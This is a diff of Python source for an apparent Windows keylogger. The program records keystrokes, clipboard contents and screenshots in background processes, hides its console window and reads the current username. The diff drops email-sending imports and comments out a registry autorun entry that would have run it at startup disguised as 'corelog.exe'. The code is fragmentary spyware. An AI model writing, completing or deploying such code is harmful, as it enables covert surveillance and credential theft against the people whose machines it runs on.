@@ -1,36 +1,23 @@
 import os
 import time
 import keyboard  # for keylogs
-import smtplib
-from email.mime.image import MIMEImage
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.header import Header
-# Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
 import getpass
-# from pip import main
 import pyperclip
-import pyautogui
 import ctypes
-import autorun
+# import autorun
 import win32process
-import shutil
-# import logging
 import dbfile
 import screenshot
 from multiprocessing import Process
 
-
-autorun.AddToRegistry('corelog.exe')
-
+# autorun.AddToRegistry('corelog.exe')
 hwnd = ctypes.windll.kernel32.GetConsoleWindow()
 if hwnd != 0:
     ctypes.windll.user32.ShowWindow(hwnd, 0)
     ctypes.windll.kernel32.CloseHandle(hwnd)
     _, pid = win32process.GetWindowThreadProcessId(hwnd)
-
 print('program started')
 img_count = 1
 comname = getpass.getuser()
@@ -103,7 +90,7 @@ def main_func():
             # record start & end datetimes
             self.start_dt = datetime.now()
             self.end_dt = datetime.now()
-
+            
         def callback(self, event):
             name = event.name
             if len(name) > 1:
@@ -216,14 +203,7 @@ if __name__ == '__main__' :
         # closing the file
         f.close()
         time.sleep(10)
-        p1 = Process(target=main_func)
-        p1.start()
-        p2 = Process(target=screenshot.remaining_images_checker)
-        p2.start()
-        p3 = Process(target=screenshot.ss_taker)
-        p3.start()
-    except:
-        time.sleep(10)
+        # autorun.AddToRegistry('corelog.exe')
         p1 = Process(target=main_func)
         p1.start()
         p2 = Process(target=screenshot.remaining_images_checker)
